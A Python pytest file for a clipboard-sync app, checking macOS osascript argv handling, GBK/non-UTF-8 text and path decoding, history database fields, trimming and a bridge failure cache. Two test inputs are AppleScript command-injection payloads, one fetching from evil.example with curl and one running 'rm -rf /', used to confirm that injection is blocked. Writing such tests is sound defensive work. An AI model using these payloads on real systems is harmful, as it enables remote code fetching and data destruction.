"""Clipboard paths that this machine cannot exercise.

The macOS writer is the one branch of the write path no Windows run reaches, so
the checks here are the ones that matter where it runs: the AppleScript payload
rides in argv and never in the script source, a file name that is not UTF-8
falls back instead of raising, and the history row keeps the fields the API and
the phone's panel read (``image_fmt``, the preview, the route a clip arrived
on) across a reload and a legacy schema.

(merged from test_clipboard_fixes.py)
"""

import os
import sqlite3
import subprocess
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from internal.clipboard import clipboard_darwin as darwin
from internal.clipboard.format import ClipboardContent, ContentType
from internal.clipboard.history_db import ClipboardHistoryDB

# ── #1 osascript argv passing (macOS write fallback) ──────────────────


class _RunCapture:
    """Stand-in for subprocess.run that records every command."""

    def __init__(self):
        self.commands = []

    def __call__(self, cmd, **kwargs):
        self.commands.append(cmd)
        return subprocess.CompletedProcess(cmd, 0)


@pytest.fixture
def run_capture(monkeypatch):
    cap = _RunCapture()
    monkeypatch.setattr(darwin.subprocess, "run", cap)
    return cap


EVIL_URL = '" & do shell script "curl http://evil.example/x" & "'


def test_set_url_never_interpolates_url_into_script(run_capture):
    w = darwin._ClipboardWriter()
    w._set_url(EVIL_URL.encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    # Payload must ride in argv, never appear in the AppleScript source.
    assert EVIL_URL not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    assert cmd[3].startswith(darwin._ARGV_MARK)
    assert cmd[3][1:] == EVIL_URL


def test_set_files_never_interpolates_paths_into_script(run_capture):
    w = darwin._ClipboardWriter()
    paths = [
        '/Users/x/He said "hi".txt',
        "-dash-leading-name.txt",
        '"; do shell script "rm -rf /"; "',
        "/Users/x/正常 文件名.png",
    ]
    w._set_files("\n".join(paths).encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    for p in paths:
        assert p not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    args = cmd[3:]
    assert [a[1:] for a in args] == paths  # marker-prefixed, order preserved


def test_write_atomic_invalid_utf8_file_data_falls_back(monkeypatch):
    # A FILE payload whose bytes are not valid UTF-8 (the 0xb8 opcode byte)
    # used to raise UnicodeDecodeError out of _write_atomic → HTTP 500 on
    # /api/paste-rich. It must fall back to the osascript _set_files path.
    monkeypatch.setattr(darwin, "_init_nspasteboard", lambda: (object(), object()))
    content = ClipboardContent(types={ContentType.FILE: b"bad-\xb8-name"})
    assert darwin._ClipboardWriter()._write_atomic(content) is False


# ── #2 image_fmt exposed through storage and web API ──────────────────


@pytest.fixture
def history_db(tmp_path):
    return ClipboardHistoryDB(
        storage_path=str(tmp_path / "history.db"),
        max_entries=50,
    )


def _bmp_entry(ts=1000.0):
    return ClipboardContent(
        types={ContentType.IMAGE_PNG: b"BM-fake-bmp-bytes"},
        timestamp=ts,
        image_fmt="bmp",
    )


def _text(body: str, ts: float) -> ClipboardContent:
    return ClipboardContent(
        types={ContentType.TEXT: body.encode("utf-8")},
        timestamp=ts,
    )


def test_image_fmt_survives_add_and_reload(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=50)
    db.add(_bmp_entry())
    assert db.get_all()[0]["image_fmt"] == "bmp"

    # A fresh instance (app restart) restores the hint from the DB row.
    db2 = ClipboardHistoryDB(storage_path=path, max_entries=50)
    assert db2.get_all()[0]["image_fmt"] == "bmp"


def test_preview_names_a_link_and_a_file_instead_of_nothing(tmp_path):
    """A URL-only or file-only clip used to store an empty preview.

    `_build_preview` had a branch for text, markup, pictures and rich text and
    nothing else, so a clip whose only format was a link or a dropped file was
    stored with `text_preview = ""` — and every surface that draws a preview
    reads that same field, so the history list, the phone's panel and the
    overview's activity feed all showed such a clip as 无内容.
    """
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=50)
    db.add(ClipboardContent(
        types={ContentType.URL: b"https://example.com/docs/install"},
        timestamp=1000.0,
    ))
    db.add(ClipboardContent(
        types={ContentType.FILE: b"C:/Users/me/Desktop/report.pdf"},
        timestamp=1001.0,
    ))
    # The stored file payload is a newline-separated path list on every platform.
    three = "\n".join(f"C:/x/f{i}.txt" for i in range(3))
    db.add(ClipboardContent(
        types={ContentType.FILE: three.encode("utf-8")},
        timestamp=1002.0,
    ))

    # Newest first, which is the order the history list draws them in.
    previews = [entry["text_preview"] for entry in db.get_all()]
    assert previews == [
        "f0.txt 等 3 个文件",
        "report.pdf",
        "https://example.com/docs/install",
    ]


class _StubCfg:
    device_id = "dev-local"
    device_name = "Local"
    peers = {}
    web_history_limit = 20


def test_api_history_exposes_image_fmt(history_db):
    history_db.add(_bmp_entry())

    from internal.web.api.history import get_history, get_history_item

    payload, status = get_history(history_db, _StubCfg())
    assert status == 200
    item = payload["items"][0]
    assert item["content_type"] == "IMAGE"
    assert item["image_fmt"] == "bmp"

    detail, status = get_history_item(
        {"entry_id": [str(item["entry_id"])]},
        history_db,
        _StubCfg(),
    )
    assert status == 200
    assert detail["item"]["image_fmt"] == "bmp"
    assert detail["item"]["types"]["IMAGE"] == "Qk0tZmFrZS1ibXAtYnl0ZXM="


def _peer_cfg(peer_id="peer-9", peer_name="Phone"):
    from types import SimpleNamespace

    cfg = _StubCfg()
    cfg.peers = {
        peer_id: SimpleNamespace(device_id=peer_id, device_name=peer_name),
    }
    return cfg


def test_api_history_local_clip_source_is_local_device_name(history_db):
    """A clip captured on this machine carries an empty source_device; the API
    must surface the local device name (not 'unknown') in both the list and
    the detail view."""
    from internal.web.api.history import get_history, get_history_item

    cfg = _peer_cfg()
    history_db.add(_text("hello", 1001.0))  # local clip: empty sid

    payload, status = get_history(history_db, cfg)
    assert status == 200
    item = payload["items"][0]
    assert item["source_device"] == ""
    assert item["source_name"] == cfg.device_name  # "Local", not "unknown"

    detail, status = get_history_item({"entry_id": [str(item["entry_id"])]}, history_db, cfg)
    assert status == 200
    assert detail["item"]["source_name"] == cfg.device_name


def test_api_history_ships_the_route_each_clip_arrived_on(history_db):
    """The panel's row names the device; the route is the half of the pair the
    name cannot give, and the panel had no way to learn it at all."""
    from internal.web.api.history import get_history

    for transport, text in (("lan", "cable"), ("relay", "internet"), ("web", "pushed")):
        content = _text(text, 1003.0)
        content.transport = transport
        history_db.add(content)
    history_db.add(_text("typed here", 1004.0))  # captured here: no route at all

    payload, status = get_history(history_db, _StubCfg())
    assert status == 200
    assert [item["transport"] for item in payload["items"]] == ["", "web", "relay", "lan"]


def test_legacy_db_without_image_fmt_column_migrates(tmp_path):
    """A pre-image_fmt database must ALTER-add the column, not fail."""
    path = tmp_path / "old.db"
    conn = sqlite3.connect(str(path))
    conn.execute(
        "CREATE TABLE history ("
        " entry_id INTEGER PRIMARY KEY, timestamp REAL NOT NULL,"
        " content_type TEXT NOT NULL DEFAULT '',"
        " text_preview TEXT NOT NULL DEFAULT '',"
        " types TEXT NOT NULL DEFAULT '{}',"
        " source_device TEXT NOT NULL DEFAULT '',"
        " source_app TEXT NOT NULL DEFAULT '',"
        " source_title TEXT NOT NULL DEFAULT '',"
        " pinned INTEGER NOT NULL DEFAULT 0,"
        " paste_count INTEGER NOT NULL DEFAULT 0)"
    )
    conn.execute(
        "INSERT INTO history (entry_id, timestamp, content_type, text_preview, types)"
        " VALUES (1, 1000.0, 'IMAGE', '[Image]', '{}')"
    )
    conn.commit()
    conn.close()

    db = ClipboardHistoryDB(storage_path=str(path), max_entries=50)
    entry = db.get_all()[0]
    assert entry["text_preview"] == "[Image]"
    assert entry["image_fmt"] == ""  # unknown -> clients fall back to PNG


# ── #3 memory trim aligned with DB trim key ───────────────────────────


def test_memory_trim_matches_db_trim_under_clock_skew(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)

    # The DB stamps local receipt time (not the sender's clock), so these
    # wildly skewed `ts` values must NOT reorder or drive the trim.
    db.add(_text("X", ts=5000.0))  # arrives first
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))
    assert len(db.get_all()) == 3

    db.add(_text("W", ts=1500.0))  # over limit -> trim one

    mem = {e["text_preview"] for e in db.get_all()}
    # Trim keeps the most recent ARRIVALS (W, Z, Y); the skewed timestamps
    # are ignored, so X — the oldest arrival — is the one dropped.
    assert mem == {"W", "Z", "Y"}

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history WHERE pinned = 0")}
    conn.close()
    assert rows == mem  # DB dropped exactly the same entry


def test_memory_trim_preserves_pinned_entries(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)
    db.add(_text("X", ts=5000.0))
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))

    eid_y = next(e["entry_id"] for e in db.get_all() if e["text_preview"] == "Y")
    assert db.batch_set_pinned([eid_y], True) == 1

    db.add(_text("W", ts=1500.0))  # 4 entries, 1 pinned -> keep top-2 unpinned

    previews = {e["text_preview"] for e in db.get_all()}
    # Local-receipt stamping: the trim keeps pinned Y plus the two most
    # recent ARRIVALS (W, Z); X — the oldest arrival — is the one dropped.
    assert previews == {"W", "Y", "Z"}

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history")}
    conn.close()
    assert rows == previews


# ── #4 FILE_COMPLETE wait timeout reason ─────────────────────────────


class TestFileCompleteTimeoutReason:
    def test_completion_wait_timeout_reports_error_timeout(self, tmp_path, monkeypatch):
        from internal.sync import file_transfer as ft_mod
        from internal.sync.file_transfer import FileTransferManager

        monkeypatch.setattr(ft_mod, "COMPLETION_WAIT_TIMEOUT", 1.0)
        # The sender now waits out the receiver's full retransmit window
        # (COMPLETION_WAIT_TIMEOUT + MAX_RETRANSMIT_ROUNDS * RETRANSMIT_TIMEOUT),
        # so shrink RETRANSMIT_TIMEOUT too or the give-up never fires in time.
        monkeypatch.setattr(ft_mod, "RETRANSMIT_TIMEOUT", 0.2)

        mgr = FileTransferManager("test-device", str(tmp_path / "out"))
        completions = []
        mgr.set_on_transfer_complete(
            lambda tid, ok, cancelled, status: completions.append((tid, ok, cancelled, status)),
        )

        f = tmp_path / "hello.bin"
        f.write_bytes(b"x" * 100)
        frames = []
        tid = mgr.send_file(str(f), frames.append)
        mgr.handle_message("file_ack", {"transfer_id": tid}, frames.append)

        deadline = time.time() + 15
        while not completions and time.time() < deadline:
            time.sleep(0.1)

        assert completions, "transfer never completed"
        done_tid, ok, cancelled, status = completions[0]
        assert done_tid == tid
        assert ok is False
        assert cancelled is False
        # A wait timeout is not a dropped connection -- it must not be
        # reported as peer_offline.
        assert status == "error_timeout"


# ── #5 text that is not UTF-8, on the way in and on the way out ───────
#
# The reported fault: 历史记录里有 ���֤������.pdf 这样的乱码.  A zh_CN Mac hands
# its clipboard text over as GBK, and everything downstream treated a TEXT
# payload as UTF-8 — so decoding it with errors="replace" did not merely show
# it wrong, it replaced the name with U+FFFD for good.

GBK_NAME = "软件验证报告.pdf"
MOJIBAKE = "������֤����.pdf"


def test_gbk_bytes_read_as_the_name_they_are():
    from internal.clipboard.format import decode_text

    assert decode_text(GBK_NAME.encode("gbk")) == GBK_NAME


def test_utf8_bytes_are_untouched():
    from internal.clipboard.format import decode_text

    assert decode_text(GBK_NAME.encode("utf-8")) == GBK_NAME


def test_no_byte_string_is_read_as_replacement_characters():
    """Whatever comes out can be written back out, which U+FFFD cannot.

    ``errors="replace"`` is what turned the GBK name into U+FFFD, and no amount
    of decoding turns U+FFFD back into the byte it replaced — the damage is done
    at the read.  Every codec this reader tries is instead an exact inverse of
    itself on the byte-to-character direction, so the reading is checkable
    without knowing which one answered: re-encoding with the codec the reader
    *reports* has to reproduce the bytes exactly.

    That is what makes a wrong guess survivable and a lossy one fatal.
    ``b"bad-\\xb8-name"`` is read as halfwidth katakana, because shift-jis is
    asked before latin-1 and accepts any byte in that range — a wrong reading,
    but one that still carries every byte, so it can be re-read correctly later
    by something that knows better.  Only the replacement character destroys
    them, which is why there must never be one.
    """
    from internal.clipboard.format import decode_text_with_encoding

    for raw in (b"\xff\x00\xfe\x01", b"bad-\xb8-name", b"\x81\x8d\x8f\x90\x9d"):
        text, encoding = decode_text_with_encoding(raw)
        assert "�" not in text, (raw, encoding)
        assert text.encode(encoding) == raw, (raw, encoding, text)

    # The reported name, in the encoding the report was about.
    text, encoding = decode_text_with_encoding(GBK_NAME.encode("gbk"))
    assert encoding == "gbk"
    assert text == GBK_NAME


def test_the_reader_can_say_which_encoding_it_had_to_guess():
    from internal.clipboard.format import decode_text_with_encoding

    assert decode_text_with_encoding(GBK_NAME.encode("gbk")) == (GBK_NAME, "gbk")
    assert decode_text_with_encoding(GBK_NAME.encode("utf-8"))[1] == "utf-8"


def test_the_reported_mojibake_is_what_a_lossy_read_would_have_produced():
    """Pins the signature the report was diagnosed from.

    ``���֤������.pdf`` is not a different name: it is these GBK bytes read as
    UTF-8 with replacement, which is what every path that decoded a payload
    that way produced.
    """
    lossy = GBK_NAME.encode("gbk").decode("utf-8", errors="replace")
    assert lossy == MOJIBAKE
    assert "�" in lossy


@pytest.mark.skipif(sys.platform != "win32", reason="Win32 clipboard API")
def test_windows_write_keeps_a_peers_non_utf8_text(monkeypatch):
    """The writer is where the U+FFFD was actually baked.

    It has to decode a peer's bytes to put them on the clipboard, and it used
    to do that as UTF-8 with replacement — so the clipboard held U+FFFD, the
    poll read that back as a new row, and the mangled name was synced on.  The
    text below is the reported file name arriving from the Mac.
    """
    from internal.clipboard import clipboard_windows as win

    written = {}
    writer = win._ClipboardWriter()
    monkeypatch.setattr(
        writer, "_set_global_format", lambda fmt, data: written.setdefault(fmt, data)
    )
    writer._set_text(GBK_NAME.encode("gbk"))

    wide = written[win.CF_UNICODETEXT].decode("utf-16-le").rstrip("\x00")
    assert wide == GBK_NAME
    assert "�" not in wide


def test_pbpaste_text_that_is_not_utf8_is_normalised_at_the_reader(monkeypatch):
    """Same fault, one step earlier: the Mac reader is where it should stop.

    ``pbpaste`` answers in the system encoding, and this is the only place that
    knows the bytes came from *this* Mac rather than from a peer.
    """
    assert darwin._as_utf8(GBK_NAME.encode("gbk")) == GBK_NAME.encode("utf-8")
    assert darwin._as_utf8(GBK_NAME.encode("utf-8")) == GBK_NAME.encode("utf-8")


# ── #6 a file copy from the Finder ────────────────────────────────────


def test_a_path_that_is_not_utf8_survives_storage_and_its_own_bytes():
    """The bridge between a stored payload and a stat-able path.

    ``os.fsencode``/``os.fsdecode`` cannot be that bridge, because what they do
    with bytes that are not valid UTF-8 is a property of the *local* interpreter
    — ``surrogateescape`` on POSIX, ``surrogatepass`` on Windows, where decoding
    one raises instead of spelling it.  These two are spelled out for that
    reason, and this pins the pair: if either is edited back to an ``os.`` call
    or to a lossy decode, this fails on the machine where it was written.
    """
    from internal.clipboard.format import decode_path, decode_paths, encode_path, encode_paths

    # GBK 报告.pdf, as the bytes a zh_CN Mac's pasteboard would have held.
    raw = b"/Users/kai/Desktop/\xb1\xa8\xb8\xe6.pdf"

    path = decode_path(raw)
    assert encode_path(path) == raw, "the pair is not an exact inverse"
    assert decode_paths(encode_paths([path, "/tmp/notes.txt"])) == [path, "/tmp/notes.txt"]

    # Whatever the bytes are, the path still reads as a name rather than as
    # replacement characters.
    from internal.clipboard import file_ref

    assert file_ref.file_name(path) == "报告.pdf"


def test_a_file_url_is_decoded_without_losing_the_name():
    """The Finder's own address for the file, percent-encoded UTF-8."""
    from urllib.parse import quote

    from internal.clipboard.format import file_url_paths

    raw = ("file:///Users/kai/Desktop/" + quote(GBK_NAME)).encode("utf-8")
    assert file_url_paths(raw) == ["/Users/kai/Desktop/" + GBK_NAME]


def test_a_file_url_whose_bytes_are_not_utf8_survives_the_decoding():
    """Percent-escapes are decoded to *bytes*, then spelled without loss.

    ``unquote`` would decode these as UTF-8 and replace what it cannot read, so
    the path would name nothing and the file would be reported as missing — a
    good file producing no offer at all.  The invariant is the round trip: what
    comes out re-encodes to exactly the bytes the pasteboard held.

    Spelled with `format.encode_path` rather than ``os.fsencode``, which is the
    same spelling only where ``sys.getfilesystemencodeerrors()`` is
    ``surrogateescape``.  On Windows it is ``surrogatepass``, so a test written
    with ``os.fsencode`` asserts the surrogates were re-encoded *as surrogates*
    and fails against a decode that was perfectly lossless — the platform
    difference `format.encode_path` exists to hide.
    """
    from internal.clipboard.format import encode_path, file_url_paths

    raw = b"file:///Users/kai/Desktop/%B1%A8%B8%E6.pdf"  # GBK 报告.pdf

    (path,) = file_url_paths(raw)

    assert encode_path(path) == b"/Users/kai/Desktop/\xb1\xa8\xb8\xe6.pdf"
    # And it still reads as the name it is, rather than as replacement chars —
    # the check that does not go through the helper the code under test uses.
    from internal.clipboard import file_ref

    assert file_ref.file_name(path) == "报告.pdf"


def test_the_shapes_a_pasteboard_publishes_a_file_in():
    """Both platforms' lists, read by one parser.

    macOS writes one ``public.file-url`` per item and Linux writes
    ``text/uri-list``; a ``#`` comment is legal in the latter, and a bare path
    is what ``pbpaste -Prefer`` answers with when it has no address to give —
    which is also why an ordinary text copy must not come back as a path.
    """
    from internal.clipboard.format import file_url_paths

    raw = (
        b"# copied by the file manager\n"
        b"file:///home/kai/a.txt\n"
        b"/home/kai/plain%20name.txt\n"  # a bare path: %20 is four characters
        b"https://example.com/a.txt\n"
        b"\n"
    )

    assert file_url_paths(raw) == ["/home/kai/a.txt", "/home/kai/plain%20name.txt"]


def test_a_bare_path_is_not_taken_for_a_url():
    """``?`` and ``#`` are characters in a Linux file name, not a query.

    Only a ``file:`` line is put through ``urlparse``, so a path spelled as
    itself keeps everything after either one.
    """
    from internal.clipboard.format import file_url_paths

    assert file_url_paths(b"/home/kai/q?uery#frag.txt") == ["/home/kai/q?uery#frag.txt"]


def test_a_network_file_url_is_not_a_path_on_this_machine():
    from internal.clipboard.format import file_url_paths

    assert file_url_paths(b"file://nas.local/share/report.pdf") == []


def test_only_absolute_existing_paths_are_served(tmp_path):
    """`pbpaste -Prefer` answers with plain text when it has no file URL.

    That text must not be read as a list of paths, which is what keeps an
    ordinary text copy from being captured as a file.  The same rule keeps a
    file manager's ``copy`` line, and a path that has since been deleted, out
    of an offer a peer could click and watch fail.
    """
    from internal.clipboard import file_ref

    real = tmp_path / GBK_NAME
    real.write_bytes(b"pdf")

    assert file_ref.servable_paths([str(real)]) == [str(real)]
    assert file_ref.servable_paths(["报告.pdf"]) == []
    assert file_ref.servable_paths([str(tmp_path / "gone.pdf")]) == []
    # A file manager's own words, which only the absolute check keeps out.
    assert file_ref.servable_paths(["copy", "cut", ""]) == []


def test_get_files_returns_the_joined_paths_every_writer_expects(monkeypatch, tmp_path):
    """The end of the chain: a real file becomes a FILE payload.

    ``NSFilenamesPboardType`` is the branch that carries a whole multi-file
    copy, and the one a Windows run can exercise end to end — its plist holds
    absolute paths directly, where ``public.file-url`` holds an address.
    """
    import plistlib

    first = tmp_path / GBK_NAME
    second = tmp_path / "notes.txt"
    first.write_bytes(b"pdf")
    second.write_bytes(b"txt")

    def plist_or_none(uti):
        if uti != b"NSFilenamesPboardType":
            return None
        return plistlib.dumps([str(first), str(second)])

    monkeypatch.setattr(darwin, "_pb_data_for_type", plist_or_none)

    payload = darwin._ClipboardReader()._get_files()

    assert payload
    from internal.clipboard.format import decode_paths

    assert decode_paths(payload) == [str(first), str(second)]
    # And the offer a peer would receive can describe them.
    from internal.clipboard import file_ref

    assert file_ref.describe(str(first))["name"] == GBK_NAME


def test_the_linux_reader_turns_a_uri_list_into_the_same_payload(monkeypatch, tmp_path):
    """The same chain on Linux, which publishes the same data as macOS.

    Driven here rather than on Linux: the reader reaches its tools through
    ``subprocess`` and ``_can_read``, both of which can be answered on this
    machine, so the wiring — pasteboard bytes in, stored payload out, offer
    buildable from it — is checked on the machine CI runs on.  Two things
    cannot be exercised here and are pinned elsewhere: a name that is not valid
    UTF-8 (Windows file names are UTF-16, so no such path exists to make) is
    `test_a_file_url_whose_bytes_are_not_utf8_survives_the_decoding`, and the
    ``file://`` shape is `test_the_shapes_a_pasteboard_publishes_a_file_in` —
    a Windows ``file:///C:/x`` address is deliberately not turned into
    ``C:\\x`` by the parser, since no reader on this platform publishes one.
    The bare-path line below is the other shape both platforms accept.
    """
    from internal.clipboard import clipboard_linux

    real = tmp_path / GBK_NAME
    real.write_bytes(b"pdf")

    class Result:
        returncode = 0
        stdout = b"# copied by the file manager\n" + str(real).encode() + b"\n"

    monkeypatch.setattr(clipboard_linux, "_can_read", lambda: True)
    monkeypatch.setattr(clipboard_linux.subprocess, "run", lambda *a, **k: Result())

    payload = clipboard_linux._ClipboardReader()._get_files()

    from internal.clipboard import file_ref
    from internal.clipboard.format import decode_paths

    assert decode_paths(payload) == [str(real)]
    assert file_ref.describe(str(real))["name"] == GBK_NAME


def test_the_linux_reader_ignores_a_text_copy(monkeypatch):
    """An ordinary text copy must not become a FILE entry.

    ``xclip -t text/uri-list`` on a clipboard holding no URI list answers
    non-zero or empty, and a file manager's own first line is a bare word.  The
    absolute check is what keeps either out of an offer.
    """
    from internal.clipboard import clipboard_linux

    class Result:
        returncode = 0
        stdout = b"copy\njust some text\n"

    monkeypatch.setattr(clipboard_linux, "_can_read", lambda: True)
    monkeypatch.setattr(clipboard_linux.subprocess, "run", lambda *a, **k: Result())

    assert clipboard_linux._ClipboardReader()._get_files() == b""


def test_a_file_clip_reads_as_a_file_row_not_as_its_own_name(tmp_path):
    """A file copy arrives with the name as text *and* the file.

    Reading TEXT first described such a clip as the words in its name, and the
    row's kind is what decides between 复制 and 下载 — so a row with a
    downloadable file in it showed 复制 and no download button.
    """
    path = str(tmp_path / GBK_NAME)
    (tmp_path / GBK_NAME).write_bytes(b"pdf")
    from internal.clipboard.format import encode_path

    content = ClipboardContent(
        types={
            ContentType.TEXT: GBK_NAME.encode("utf-8"),
            ContentType.FILE: encode_path(path),
            ContentType.URL: ("file://" + path).encode("utf-8"),
        },
        timestamp=1000.0,
    )
    assert content.best_format()[0] == ContentType.FILE

    db = ClipboardHistoryDB(storage_path=str(tmp_path / "h.db"), max_entries=50)
    db.add(content)
    row = db.get_all()[0]
    assert row["content_type"] == "FILE"
    assert GBK_NAME in row["text_preview"]


# ── The NSPasteboard bridge's failure cache ───────────────────────────────────

@pytest.fixture
def bridge(monkeypatch):
    """A bridge that cannot be built, with its clock and its log under the test's hand.

    Returns the state and two knobs: `attempts()` for how many times the setup was tried,
    and `tick()` to move the clock past the cooldown without sleeping.
    """
    state = {"now": 1000.0, "attempts": 0}

    def find_library(_name):
        state["attempts"] += 1
        return None  # the failure path: no libobjc, so no bridge

    monkeypatch.setattr(darwin.ctypes.util, "find_library", find_library)
    monkeypatch.setattr(darwin.time, "monotonic", lambda: state["now"])
    monkeypatch.setattr(darwin, "_nspasteboard_objc", None)
    monkeypatch.setattr(darwin, "_nspasteboard_instance", None)
    monkeypatch.setattr(darwin, "_bridge_failed_at", 0.0)
    monkeypatch.setattr(darwin, "_bridge_logged_at", 0.0)
    return state


def test_a_failed_bridge_is_not_rebuilt_on_every_poll(bridge):
    """The whole fault: five calls per poll, one poll per 0.4s, all rebuilding it.

    Twenty calls stand in for four seconds of polling.  One attempt is the fix; twenty is
    what was happening.
    """
    for _ in range(20):
        assert darwin._init_nspasteboard() == (None, None)
    assert bridge["attempts"] == 1, "the bridge was rebuilt inside its cooldown"


def test_the_bridge_is_retried_after_its_cooldown(bridge):
    """A refusal that goes away must still recover, or this trades work for function."""
    assert darwin._init_nspasteboard() == (None, None)
    assert bridge["attempts"] == 1

    bridge["now"] += darwin._BRIDGE_RETRY_SECONDS + 1
    assert darwin._init_nspasteboard() == (None, None)
    assert bridge["attempts"] == 2, "the cooldown never expires"


def test_a_repeated_failure_is_logged_once(bridge, caplog):
    """9605 lines said the same thing.  The first one is the one worth reading."""
    import logging

    with caplog.at_level(logging.DEBUG, logger="internal.clipboard.clipboard_darwin"):
        for _ in range(50):
            darwin._init_nspasteboard()
            # Walk the clock forward inside the cooldown, as polling does.
            bridge["now"] += 0.4

    failures = [r for r in caplog.records if "libobjc" in r.getMessage()]
    assert len(failures) == 1, f"logged {len(failures)} times: {[r.getMessage() for r in failures]}"


def test_each_cooldown_logs_again(bridge, caplog):
    """Silence is not the goal -- one line a minute is, so a lasting fault stays visible."""
    import logging

    with caplog.at_level(logging.DEBUG, logger="internal.clipboard.clipboard_darwin"):
        for minute in range(3):
            bridge["now"] += darwin._BRIDGE_RETRY_SECONDS + 1
            darwin._init_nspasteboard()
            # One attempt per cooldown, counting the one the first iteration makes.  The
            # earlier version of this test expected one more, having copied the count from
            # a test that calls `_init_nspasteboard` once before its loop -- the
            # implementation was right and the expectation was wrong.
            assert bridge["attempts"] == minute + 1, "each cooldown should allow one attempt"

    failures = [r for r in caplog.records if "libobjc" in r.getMessage()]
    assert len(failures) == 3, f"expected one per cooldown, got {len(failures)}"
